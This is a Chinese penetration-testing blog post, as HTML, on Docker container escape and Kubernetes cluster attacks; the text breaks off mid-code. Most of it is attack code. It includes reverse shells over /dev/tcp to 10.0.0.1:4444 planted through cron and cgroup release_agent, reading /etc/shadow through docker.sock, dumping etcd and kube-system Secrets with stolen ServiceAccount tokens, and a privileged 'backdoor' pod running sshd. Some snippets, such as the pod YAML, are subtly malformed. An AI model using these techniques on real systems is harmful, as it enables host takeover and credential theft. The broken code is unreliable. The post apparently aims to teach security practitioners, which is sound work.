@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="前言云原生时代，Docker 提供轻量级隔离，Kubernetes 负责编排调度——两者共同引入了一条全新的攻击面。本文梳理容器逃逸与 K8s 集群渗透的核心手法，附可复现的代码示例，帮助安全从业者建立云原生攻防视角。  免责声明：本文所有技术内容仅供安全研究与授权测试使用。未经授权对他人系统实施攻击属于违法行为，读者须自行承担由此产生的一切法律后果。   攻击全景图flowchart LR">
+<meta property="og:type" content="article">
+<meta property="og:title" content="云原生：Docker与Kubernetes安全">
+<meta property="og:url" content="https://congliang.github.io/Docker-K8s-security/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="前言云原生时代，Docker 提供轻量级隔离，Kubernetes 负责编排调度——两者共同引入了一条全新的攻击面。本文梳理容器逃逸与 K8s 集群渗透的核心手法，附可复现的代码示例，帮助安全从业者建立云原生攻防视角。  免责声明：本文所有技术内容仅供安全研究与授权测试使用。未经授权对他人系统实施攻击属于违法行为，读者须自行承担由此产生的一切法律后果。   攻击全景图flowchart LR">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-10-01T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:35:18.322Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="云安全">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/Docker-K8s-security/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/Docker-K8s-security/","path":"Docker-K8s-security/","title":"云原生：Docker与Kubernetes安全"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>云原生：Docker与Kubernetes安全 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%85%A8%E6%99%AF%E5%9B%BE"><span class="nav-number">2.</span> <span class="nav-text">攻击全景图</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81Docker-%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8"><span class="nav-number">3.</span> <span class="nav-text">一、Docker 容器逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-%E7%89%B9%E6%9D%83%E5%AE%B9%E5%99%A8"><span class="nav-number">3.1.</span> <span class="nav-text">1.1 特权容器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-docker-sock-%E6%8C%82%E8%BD%BD%E5%88%A9%E7%94%A8"><span class="nav-number">3.2.</span> <span class="nav-text">1.2 docker.sock 挂载利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-Cgroup-Release-Agent"><span class="nav-number">3.3.</span> <span class="nav-text">1.3 Cgroup Release Agent</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-Procfs-%E6%8C%82%E8%BD%BD"><span class="nav-number">3.4.</span> <span class="nav-text">1.4 Procfs 挂载</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81Kubernetes-%E9%9B%86%E7%BE%A4%E6%B8%97%E9%80%8F"><span class="nav-number">4.</span> <span class="nav-text">二、Kubernetes 集群渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-API-Server-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="nav-number">4.1.</span> <span class="nav-text">2.1 API Server 未授权访问</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-etcd-%E6%9A%B4%E9%9C%B2"><span class="nav-number">4.2.</span> <span class="nav-text">2.2 etcd 暴露</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-ServiceAccount-Token-%E5%88%A9%E7%94%A8"><span class="nav-number">4.3.</span> <span class="nav-text">2.3 ServiceAccount Token 利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-RBAC-%E6%8F%90%E6%9D%83"><span class="nav-number">4.4.</span> <span class="nav-text">2.4 RBAC 提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-5-Kubelet-API"><span class="nav-number">4.5.</span> <span class="nav-text">2.5 Kubelet API</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-6-Pod-%E9%80%83%E9%80%B8%E2%80%94%E2%80%94CRI-Socket"><span class="nav-number">4.6.</span> <span class="nav-text">2.6 Pod 逃逸——CRI Socket</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-7-Network-Policy-%E7%BB%95%E8%BF%87"><span class="nav-number">4.7.</span> <span class="nav-text">2.7 Network Policy 绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E5%AE%8C%E6%95%B4%E6%94%BB%E5%87%BB%E9%93%BE%E6%80%BB%E7%BB%93"><span class="nav-number">5.</span> <span class="nav-text">三、完整攻击链总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E9%80%9F%E6%9F%A5%E9%98%B2%E5%BE%A1%E8%A1%A8"><span class="nav-number">6.</span> <span class="nav-text">四、速查防御表</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%93%E8%AF%AD"><span class="nav-number">7.</span> <span class="nav-text">结语</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Docker-K8s-security/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="云原生：Docker与Kubernetes安全 | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          云原生：Docker与Kubernetes安全
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-10-01 08:00:00" itemprop="dateCreated datePublished" datetime="2025-10-01T08:00:00+08:00">2025-10-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:35:18" itemprop="dateModified" datetime="2026-06-04T23:35:18+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>云原生时代，Docker 提供轻量级隔离，Kubernetes 负责编排调度——两者共同引入了一条全新的攻击面。本文梳理容器逃逸与 K8s 集群渗透的核心手法，附可复现的代码示例，帮助安全从业者建立云原生攻防视角。</p>
+<blockquote>
+<p><strong>免责声明</strong>：本文所有技术内容仅供安全研究与授权测试使用。未经授权对他人系统实施攻击属于违法行为，读者须自行承担由此产生的一切法律后果。</p>
+</blockquote>
+<hr>
+<h2 id="攻击全景图"><a href="#攻击全景图" class="headerlink" title="攻击全景图"></a>攻击全景图</h2><pre class="mermaid">flowchart LR
+    A[入口: Web RCE / 镜像投毒] --> B{容器内立足}
+    B -->|特权容器| C1[挂载宿主机磁盘]
+    B -->|docker.sock挂载| C2[Docker API 创建容器]
+    B -->|SYS_ADMIN| C3[cgroup release_agent]
+    B -->|默认SA Token| D[枚举K8s API]
+
+    C1 --> E[宿主机 Root]
+    C2 --> E
+    C3 --> E
+
+    D -->|RBAC绕过| F[创建特权Pod -> 宿主机]
+    D -->|Secrets读权| G[窃取高权Token]
+    D -->|etcd暴露| H[直接读取集群密钥]
+
+    G --> I[集群完全控制]
+    H --> I</pre>
+
+<hr>
+<h2 id="一、Docker-容器逃逸"><a href="#一、Docker-容器逃逸" class="headerlink" title="一、Docker 容器逃逸"></a>一、Docker 容器逃逸</h2><h3 id="1-1-特权容器"><a href="#1-1-特权容器" class="headerlink" title="1.1 特权容器"></a>1.1 特权容器</h3><p><code>--privileged</code> 赋予容器几乎所有 Capability，且关闭 AppArmor&#x2F;Seccomp。检测方法：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/1/status | grep CapEff</span><br><span class="line"><span class="comment"># 若输出 CapEff: 0000003fffffffff 则极可能是特权容器</span></span><br><span class="line">fdisk -l   <span class="comment"># 可见宿主机磁盘</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>逃逸——挂载宿主机根分区并写 cron</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /tmp/host &amp;&amp; mount /dev/sda1 /tmp/host</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;*/1 * * * * root bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1&#x27;&quot;</span> \</span><br><span class="line">  &gt; /tmp/host/etc/cron.d/escape</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-2-docker-sock-挂载利用"><a href="#1-2-docker-sock-挂载利用" class="headerlink" title="1.2 docker.sock 挂载利用"></a>1.2 docker.sock 挂载利用</h3><p><code>/var/run/docker.sock</code> 是 Docker Daemon 的 Unix Socket，能与之通信即等同 Root。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在挂载了 docker.sock 的容器内探测</span></span><br><span class="line">docker -H unix:///var/run/docker.sock ps</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再启一个特权容器并挂载宿主机根目录</span></span><br><span class="line">docker -H unix:///var/run/docker.sock run -it --privileged \</span><br><span class="line">  -v /:/host ubuntu <span class="built_in">chroot</span> /host bash</span><br></pre></td></tr></table></figure>
+
+<p><strong>Python 调用 Docker API</strong>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, json, urllib3; urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">sock_url = <span class="string">&#x27;http+unix://%2Fvar%2Frun%2Fdocker.sock&#x27;</span></span><br><span class="line">cid = <span class="built_in">open</span>(<span class="string">&#x27;/proc/self/cgroup&#x27;</span>).read().split(<span class="string">&#x27;/&#x27;</span>)[-<span class="number">1</span>].strip()</span><br><span class="line">data = &#123;<span class="string">&quot;AttachStdin&quot;</span>: <span class="literal">True</span>, <span class="string">&quot;AttachStdout&quot;</span>: <span class="literal">True</span>, <span class="string">&quot;AttachStderr&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">        <span class="string">&quot;Cmd&quot;</span>: [<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;cat /etc/shadow&quot;</span>], <span class="string">&quot;Privileged&quot;</span>: <span class="literal">False</span>&#125;</span><br><span class="line">requests.post(<span class="string">f&#x27;<span class="subst">&#123;sock_url&#125;</span>/containers/<span class="subst">&#123;cid&#125;</span>/exec&#x27;</span>,</span><br><span class="line">    headers=&#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;, data=json.dumps(data))</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-3-Cgroup-Release-Agent"><a href="#1-3-Cgroup-Release-Agent" class="headerlink" title="1.3 Cgroup Release Agent"></a>1.3 Cgroup Release Agent</h3><p>当容器持有 <code>CAP_SYS_ADMIN</code> 且 cgroup 可写时，通过 <code>release_agent</code> 在宿主机执行任意命令。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /tmp/cgrp &amp;&amp; mount -t cgroup -o memory cgroup_mem /tmp/cgrp</span><br><span class="line"><span class="built_in">mkdir</span> /tmp/cgrp/x</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#!/bin/bash&#x27;</span> &gt; /release_agent.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1&#x27;</span> &gt;&gt; /release_agent.sh</span><br><span class="line"><span class="built_in">chmod</span> +x /release_agent.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取宿主机 overlay 路径</span></span><br><span class="line">host_path=$(sed -n <span class="string">&#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27;</span> /etc/mtab | <span class="built_in">head</span> -1)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$host_path</span>/release_agent.sh&quot;</span> &gt; /tmp/cgrp/release_agent</span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发</span></span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /tmp/cgrp/x/cgroup.procs</span><br><span class="line"><span class="built_in">rmdir</span> /tmp/cgrp/x</span><br></pre></td></tr></table></figure>
+
+<p>原理：cgroup 中进程全部退出时，内核以 Root 执行 <code>release_agent</code> 脚本，而该脚本路径指向了宿主机文件系统中的文件。</p>
+<h3 id="1-4-Procfs-挂载"><a href="#1-4-Procfs-挂载" class="headerlink" title="1.4 Procfs 挂载"></a>1.4 Procfs 挂载</h3><p>宿主机 <code>/proc</code> 挂载进容器意味着信息泄露和可能的提权。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -la /proc/1/root               <span class="comment"># 确认宿主机 proc 视角</span></span><br><span class="line">ps aux                             <span class="comment"># 可枚举所有进程</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 若 /proc/sys/kernel/core_pattern 可写</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;|/tmp/payload.sh&#x27;</span> &gt; /host/proc/sys/kernel/core_pattern</span><br><span class="line"><span class="comment"># 制造 core dump 触发 payload.sh 以 Root 执行</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="二、Kubernetes-集群渗透"><a href="#二、Kubernetes-集群渗透" class="headerlink" title="二、Kubernetes 集群渗透"></a>二、Kubernetes 集群渗透</h2><h3 id="2-1-API-Server-未授权访问"><a href="#2-1-API-Server-未授权访问" class="headerlink" title="2.1 API Server 未授权访问"></a>2.1 API Server 未授权访问</h3><p>API Server（6443&#x2F;旧版8080）是集群控制中枢，未授权即集群沦陷。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 探测（旧版 8080 默认无认证）</span></span><br><span class="line">curl http://&lt;IP&gt;:8080/api/v1/namespaces</span><br><span class="line">curl -k https://&lt;IP&gt;:6443/api/v1/pods</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 kubectl 接入并创建特权 Pod</span></span><br><span class="line">kubectl --server=https://&lt;IP&gt;:6443 --insecure-skip-tls-verify get nodes</span><br><span class="line"><span class="built_in">cat</span> &lt;&lt;<span class="string">EOF | kubectl --server=https://&lt;IP&gt;:6443 apply -f -</span></span><br><span class="line"><span class="string">apiVersion: v1</span></span><br><span class="line"><span class="string">kind: Pod</span></span><br><span class="line"><span class="string">metadata: &#123;name: evil, namespace: default&#125;</span></span><br><span class="line"><span class="string">spec:</span></span><br><span class="line"><span class="string">  containers:</span></span><br><span class="line"><span class="string">    image: ubuntu:22.04</span></span><br><span class="line"><span class="string">    command: [&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;sleep 99999&quot;]</span></span><br><span class="line"><span class="string">    securityContext: &#123;privileged: true&#125;</span></span><br><span class="line"><span class="string">    volumeMounts:</span></span><br><span class="line"><span class="string">    - &#123;name: host, mountPath: /host&#125;</span></span><br><span class="line"><span class="string">  volumes:</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-etcd-暴露"><a href="#2-2-etcd-暴露" class="headerlink" title="2.2 etcd 暴露"></a>2.2 etcd 暴露</h3><p>etcd 存储集群所有 Secrets 和 RBAC 配置（端口 2379&#x2F;2380）。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> ETCDCTL_API=3</span><br><span class="line">etcdctl --endpoints=http://&lt;IP&gt;:2379 get / --prefix --keys-only</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取所有 Secrets</span></span><br><span class="line">etcdctl --endpoints=http://&lt;IP&gt;:2379 get /registry/secrets/ --prefix -w json | \</span><br><span class="line">  jq -r <span class="string">&#x27;.kvs[].value&#x27;</span> | <span class="built_in">base64</span> -d</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-3-ServiceAccount-Token-利用"><a href="#2-3-ServiceAccount-Token-利用" class="headerlink" title="2.3 ServiceAccount Token 利用"></a>2.3 ServiceAccount Token 利用</h3><p>K8s 默认将 SA Token 挂载到 <code>/var/run/secrets/kubernetes.io/serviceaccount/</code>。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 读取凭证</span></span><br><span class="line">TOKEN=$(<span class="built_in">cat</span> /var/run/secrets/kubernetes.io/serviceaccount/token)</span><br><span class="line">APISERVER=https://<span class="variable">$&#123;KUBERNETES_SERVICE_HOST&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 探测当前权限</span></span><br><span class="line">curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \</span><br><span class="line">  -H <span class="string">&quot;Authorization: Bearer <span class="variable">$TOKEN</span>&quot;</span> \</span><br><span class="line">  <span class="variable">$APISERVER</span>/api/v1/namespaces/default/pods | jq .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查阅 Secrets（取决于 RBAC）</span></span><br><span class="line">curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \</span><br><span class="line">  -H <span class="string">&quot;Authorization: Bearer <span class="variable">$TOKEN</span>&quot;</span> \</span><br><span class="line">  <span class="variable">$APISERVER</span>/api/v1/namespaces/kube-system/secrets | jq .</span><br></pre></td></tr></table></figure>
+
+<p><strong>利用高权限 Token 创建后门 Pod</strong>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, requests, urllib3; urllib3.disable_warnings()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/var/run/secrets/kubernetes.io/serviceaccount/token&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    token = f.read()</span><br><span class="line">ca = <span class="string">&#x27;/var/run/secrets/kubernetes.io/serviceaccount/ca.crt&#x27;</span></span><br><span class="line">api = <span class="string">f&quot;https://<span class="subst">&#123;os.environ[<span class="string">&#x27;KUBERNETES_SERVICE_HOST&#x27;</span>]&#125;</span>&quot;</span></span><br><span class="line">evil = &#123;</span><br><span class="line">    <span class="string">&quot;apiVersion&quot;</span>: <span class="string">&quot;v1&quot;</span>, <span class="string">&quot;kind&quot;</span>: <span class="string">&quot;Pod&quot;</span>,</span><br><span class="line">    <span class="string">&quot;metadata&quot;</span>: &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;backdoor&quot;</span>, <span class="string">&quot;namespace&quot;</span>: <span class="string">&quot;default&quot;</span>&#125;,</span><br><span class="line">    <span class="string">&quot;spec&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;containers&quot;</span>: [&#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">&quot;bd&quot;</span>, <span class="string">&quot;image&quot;</span>: <span class="string">&quot;alpine&quot;</span>,</span><br><span class="line">            <span class="string">&quot;command&quot;</span>: [<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;apk add openssh; ssh-keygen -A; /usr/sbin/sshd -D&quot;</span>],</span><br><span class="line">            <span class="string">&quot;securityContext&quot;</span>: &#123;<span class="string">&quot;privileged&quot;</span>: <span class="literal">True</span>&#125;,</span><br><span class="line">            <span 